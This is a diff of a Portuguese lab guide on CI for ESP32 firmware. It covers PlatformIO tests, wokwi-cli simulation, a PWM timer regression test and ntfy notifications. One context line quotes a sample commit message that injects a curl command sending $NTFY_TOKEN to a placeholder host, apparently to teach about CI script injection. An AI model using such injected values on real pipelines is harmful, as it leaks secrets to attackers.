@@ -13,6 +13,7 @@ sidebar_position: 13
 - [ ] Notificações no ntfy (sucesso, falha e release) e release com o `firmware.bin` ao criar a tag `v1.0.0` (T6)
 - [ ] Previsões P1–P4 respondidas no `README.md`
 - [ ] Nenhum `push --force`; cada tarefa num commit `Tn:`
+- [ ] Logout do Git e do `gh` no computador do laboratório
 
 :::info[Pontuação]
 **T1…T6 = 100 pts** (esta aula não tem desafios): T1 10 · T2 20 · T3 15 · T4 20 · T5 15 ·
@@ -27,9 +28,10 @@ T6 20. O autograder normaliza para 0–10. Vale o commit `Tn:` mais recente de c
 
 ---
 
-Até o Lab 09, um firmware "funcionava" quando **alguém** o rodava no Wokwi, girava o
-potenciômetro, mexia no slider do DHT22 e conferia o serial. Cada mudança no código pedia o
-mesmo ritual, e ninguém garantia que uma correção hoje não quebrasse o modo `auto` de ontem.
+No Lab 02 você já rodou o `wokwi-cli` com `--expect-text`, mas só para conferir uma linha do
+serial. Depois disso, até o Lab 09, um firmware "funcionava" quando **alguém** o rodava no Wokwi,
+girava o potenciômetro, mexia no slider do DHT22 e conferia o serial. Cada mudança no código pedia
+o mesmo ritual, e ninguém garantia que uma correção hoje não quebrasse o modo `auto` de ontem.
 
 Nesta aula, o firmware da câmara (Lab 07/08) passa a ser **verificado por máquina**, a cada
 `push`:
@@ -150,8 +152,8 @@ Lab 07, com os tópicos em `lab10`) em `src/main.cpp`:
 />
 
 :::info[Tópicos do Lab 10]
-O firmware normal continua falando MQTT, agora em `elt85b/lab10/grupo-x/` (`dht`, `adc`,
-`pwm`, `status`), com os comandos em `elt85b/lab10/grupo-x/cmd/<nome>`: `modo`, `aquecedor`,
+O firmware normal continua falando MQTT, agora em `elt73a/lab10/grupo-x/` (`dht`, `adc`,
+`pwm`, `status`), com os comandos em `elt73a/lab10/grupo-x/cmd/<nome>`: `modo`, `aquecedor`,
 `ventilador` e `intervalo`. O firmware de **CI** (`env:ci`) não usa rede: recebe os mesmos
 comandos pela **serial**, uma linha `<nome> <valor>` (`modo auto`, `aq 50`, `intervalo 2`).
 :::
@@ -159,6 +161,11 @@ comandos pela **serial**, uma linha `<nome> <valor>` (`modo auto`, `aq 50`, `int
 ---
 
 ## Parte 1 — Lógica testável {/* #parte-1 */}
+
+:::info[Suba o stack do LAB10!]
+Execute os comandos para subir o [stack do LAB10](/infra/setup/gen_iot_aluno#lab-10)!
+:::
+
 
 ### 1.1 Decisão × periférico
 
@@ -304,8 +311,10 @@ bibliotecas diferentes em dias diferentes. Fixe a plataforma e as bibliotecas, e
 propósito, num commit próprio.
 :::
 
-```powershell title="Terminal do PlatformIO"
-pio run -e esp32dev -e ci | Out-File -Encoding utf8 evidencias/t1-build.txt
+```shell title="Terminal do VS Code (cmd)"
+if not exist evidencias mkdir evidencias
+pio run -e esp32dev -e ci > evidencias\t1-build.txt 2>&1
+type evidencias\t1-build.txt
 ```
 
 ```text title="evidencias/t1-build.txt (final)"
@@ -450,9 +459,10 @@ int main() { return rodarTestes(); }
 | `interpretarPercentual` | válidos, `"12.5\r\n"`, fora da faixa, lixo, `"50abc"`, vazio                       |
 | `formatarPwm`           | JSON exato, `t` = NAN vira `null`, buffer pequeno não estoura                      |
 
-```powershell title="Terminal do PlatformIO"
+```shell title="Terminal do VS Code (cmd)"
 pio test -e native --junit-output-path relatorio-native.xml
-pio test -e native | Out-File -Encoding utf8 evidencias/t2-pio-test.txt
+pio test -e native > evidencias\t2-pio-test.txt 2>&1
+type evidencias\t2-pio-test.txt
 ```
 
 ```text title="evidencias/t2-pio-test.txt (final)"
@@ -497,11 +507,14 @@ quantos dos 4096 valores do ADC o resultado muda?) e escreva um teste que **pegu
 
 ### 3.1 Instalar e configurar o token
 
-```powershell title="Terminal (raiz do repositório)"
-curl.exe -L -o wokwi-cli.exe https://github.com/wokwi/wokwi-cli/releases/download/v0.28.1/wokwi-cli-win-x64.exe
-.\wokwi-cli.exe --version                       # 0.28.1
-$env:WOKWI_CLI_TOKEN = "cole-aqui-o-token"      # só nesta janela do terminal
+```shell title="Terminal do VS Code (cmd), na raiz do repositório"
+curl -L -o wokwi-cli.exe https://github.com/wokwi/wokwi-cli/releases/download/v0.28.1/wokwi-cli-win-x64.exe
+wokwi-cli.exe --version
+rem o token vale só nesta janela do terminal (sem aspas e sem espaços em volta do =)
+set WOKWI_CLI_TOKEN=cole-aqui-o-token
 ```
+
+O `--version` tem de responder `0.28.1`.
 
 No Linux e no macOS, baixe `wokwi-cli-linuxstatic-x64` ou `wokwi-cli-macos-arm64` e use
 `export WOKWI_CLI_TOKEN=...`. O `.gitignore` já ignora o executável.
@@ -513,8 +526,9 @@ Nunca coloque o token num arquivo do repositório, nem no `ci.yml`. No GitHub, e
 
 ### 3.2 Lint do diagrama (sem token)
 
-```powershell title="Terminal"
-.\wokwi-cli.exe lint --warnings-as-errors . | Out-File -Encoding utf8 evidencias/t3-lint.txt
+```shell title="Terminal do VS Code (cmd)"
+wokwi-cli.exe lint --warnings-as-errors . > evidencias\t3-lint.txt 2>&1
+type evidencias\t3-lint.txt
 ```
 
 O `diagram.json` do Lab 07 **não passa**: o `lint` acusa um atributo que o analisador lógico
@@ -546,7 +560,7 @@ teste usam. Se o teste tivesse as próprias constantes, ele testaria outra confi
 #define AQ_PIN   25            // aquecedor: 5 Hz
 #define VE_PIN   26            // ventilador: 25 kHz
 #define AQ_CANAL 0
-#define VE_CANAL 1             // como no Lab 07 (o test_alvo vai reclamar: veja abaixo)
+#define VE_CANAL 2             // como no Lab 07: canal 2 = timer 1 (o 1 dividiria o timer 0)
 ```
 
 No `main.cpp`, apague os `#define` correspondentes e acrescente `#include "hardware.h"`.
@@ -598,30 +612,34 @@ void test_adc_do_potenciometro() {
 //  no 3.x: ledcAttachChannel() e ledcReadFreq(pino))
 ```
 
-:::danger[O defeito que estava no Lab 07]
-Rode o `test_alvo` com o `hardware.h` acima. Os testes de 5 Hz e de 25 kHz **passam**, mas
-`test_canais_em_timers_diferentes` **falha**: depois de configurar o ventilador, o aquecedor está
-a 25 kHz. No core Arduino 2.x, o `ledcSetup(canal, ...)` escolhe o timer pelo número do canal
-(`timer = (canal / 2) % 4`), então os canais **0 e 1 dividem o timer 0**, e o último
-`ledcSetup()` vence. O firmware do Lab 07 tinha esse defeito, e nenhum teste o pegava, porque
-cada teste conferia a frequência logo depois de configurar.
+:::tip[Veja o teste de regressão falhar]
+Os seis testes passam com o `hardware.h` acima. Agora mude, de propósito, para
+`#define VE_CANAL 1` e rode o `test_alvo` de novo. Os testes de 5 Hz e de 25 kHz **continuam
+passando**, mas `test_canais_em_timers_diferentes` **falha**: depois de configurar o ventilador, o
+aquecedor está a 25 kHz. No core Arduino 2.x, o `ledcSetup(canal, ...)` escolhe o timer pelo número
+do canal (`timer = (canal / 2) % 4`), então os canais **0 e 1 dividem o timer 0**, e o último
+`ledcSetup()` vence (é a nota "Canal e timer" do Lab 07). Cada um dos outros testes confere a
+frequência logo depois de configurar, e por isso nenhum deles pega o defeito.
 
-Corrija no `hardware.h`: `#define VE_CANAL 2` (timer 1). Os seis testes passam, e o firmware
-corrige junto, porque usa o mesmo arquivo. É para isso que serve um **teste de regressão**: o
-defeito não volta sem que alguém fique sabendo. (No ESP-IDF do Lab 09, o timer de cada canal é
-escolhido explicitamente, e o defeito nem aparece.)
+Volte para `#define VE_CANAL 2` antes do commit. É para isso que serve um **teste de regressão**:
+se alguém "simplificar" o canal para 1 um dia, o CI fica vermelho. Como o firmware e o teste usam
+o mesmo `hardware.h`, o teste confere exatamente a configuração que vai para o ESP32. (No ESP-IDF
+do Lab 09, o timer de cada canal é escolhido explicitamente, e o defeito nem aparece.)
 :::
 
 O `pio test` **compila** o teste para o ESP32 e para (não há placa para gravar). O `wokwi-cli`
 **roda** o `.elf` e decide pelo texto do serial:
 
-```powershell title="Terminal"
-foreach ($t in "test_logica", "test_alvo") {
-  pio test -e esp32dev -f $t --without-uploading --without-testing
-  .\wokwi-cli.exe --elf .pio/build/esp32dev/firmware.elf --timeout 30000 `
-    --expect-text "Tests 0 Failures" --fail-text ":FAIL" `
-    --serial-log-file "evidencias/t3-alvo-$t.txt" .
-}
+Os dois testes usam a mesma pasta `.pio/build/esp32dev/`: compile e rode um de cada vez.
+
+```shell title="Terminal do VS Code (cmd): test_logica"
+pio test -e esp32dev -f test_logica --without-uploading --without-testing
+wokwi-cli.exe --elf .pio/build/esp32dev/firmware.elf --timeout 30000 --expect-text "Tests 0 Failures" --fail-text ":FAIL" --serial-log-file evidencias/t3-alvo-test_logica.txt .
+```
+
+```shell title="Terminal do VS Code (cmd): test_alvo"
+pio test -e esp32dev -f test_alvo --without-uploading --without-testing
+wokwi-cli.exe --elf .pio/build/esp32dev/firmware.elf --timeout 30000 --expect-text "Tests 0 Failures" --fail-text ":FAIL" --serial-log-file evidencias/t3-alvo-test_alvo.txt .
 ```
 
 ```text title="Saída esperada (test_alvo, com VE_CANAL 2)"
@@ -699,7 +717,7 @@ Cada passo tem **um** comando (e um `name` opcional). O potenciômetro aceita `p
 ```yaml title="ci/cenario_integracao.yaml"
 name: Camara - modos pot e auto
 version: 1
-author: ELT85B
+author: ELT73A
 
 # O diagram.json começa com o potenciômetro em 0 e o DHT22 em 24,5 °C: estado conhecido.
 steps:
@@ -770,16 +788,16 @@ começa em 0: se começasse no meio, o `[PWM]` de 50 % sairia no `setup()`, **an
 `[BOOT] pronto`, e o passo "Os dois canais vão a 50 %" esperaria para sempre.
 
 Com `--vcd-file`, o `wokwi-cli` grava o **analisador lógico** (D0 = GPIO25, D1 = GPIO26) num
-arquivo VCD, o mesmo formato que o PulseView abre. (Com `VE_CANAL 1`, o D0 sairia a 25 kHz e o
-`verificar_pwm.py` acusaria: é o mesmo defeito da T3, visto agora no firmware inteiro.) O `ci/verificar_pwm.py` (pronto, só
+arquivo VCD, o mesmo formato que o PulseView abre. (Se alguém mudasse o `VE_CANAL` para 1, o D0 sairia a 25 kHz e o
+`verificar_pwm.py` acusaria: é o mesmo defeito do teste de regressão da T3, visto agora no firmware inteiro.) O `ci/verificar_pwm.py` (pronto, só
 biblioteca padrão) procura em cada canal um trecho com a frequência e o duty esperados:
 
-```powershell title="Terminal"
+```shell title="Terminal do VS Code (cmd)"
 pio run -e ci
-.\wokwi-cli.exe --elf .pio/build/ci/firmware.elf --scenario ci/cenario_integracao.yaml `
-  --timeout 90000 --vcd-file pwm.vcd --serial-log-file serial-cenario.txt . 2>&1 |
-  Out-File -Encoding utf8 evidencias/t4-cenario.txt
-py ci/verificar_pwm.py pwm.vcd --listar | Out-File -Encoding utf8 evidencias/t4-pwm.txt
+wokwi-cli.exe --elf .pio/build/ci/firmware.elf --scenario ci/cenario_integracao.yaml --timeout 90000 --vcd-file pwm.vcd --serial-log-file serial-cenario.txt . > evidencias\t4-cenario.txt 2>&1
+type evidencias\t4-cenario.txt
+py ci\verificar_pwm.py pwm.vcd --listar > evidencias\t4-pwm.txt 2>&1
+type evidencias\t4-pwm.txt
 ```
 
 ```text title="evidencias/t4-cenario.txt (trecho)"
@@ -1179,7 +1197,7 @@ manda uma notificação para o celular.
    2. **Verde:** feche o PR sem juntar (ou desfaça a mudança). No `main`, chega "✅ ... CI ok".
    3. **Release:** crie e envie a tag:
 
-      ```powershell title="Terminal"
+      ```shell title="Terminal do VS Code (cmd)"
       git tag -a v1.0.0 -m "Lab 10: firmware testado"
       git push origin v1.0.0
       ```
@@ -1232,5 +1250,9 @@ Imagine um commit com a mensagem `x"; curl https://exemplo.invalid/?t=$NTFY_TOKE
 />
 
 ---
+
+## Logout do seu ambiente dev, git e gh {/* #logout */}
+
+<GitLogOut />
 
 <LabLogout />
